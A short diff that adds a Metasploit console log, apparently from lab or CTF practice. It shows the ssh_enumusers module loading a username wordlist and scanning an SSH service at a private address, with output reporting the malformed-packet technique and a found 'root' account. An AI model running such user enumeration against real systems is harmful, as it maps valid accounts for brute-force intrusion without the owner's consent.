@@ -1,0 +1,10 @@
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE ~/Documents/Security/wordlists/names.txt
+USER_FILE => ~/Documents/Security/wordlists/names.txt
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
+
+[*] 10.13.37.10:22 - SSH - Using malformed packet technique
+[*] 10.13.37.10:22 - SSH - Checking for false positives
+[*] 10.13.37.10:22 - SSH - Starting scan
+[+] 10.13.37.10:22 - SSH - User 'root' found
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
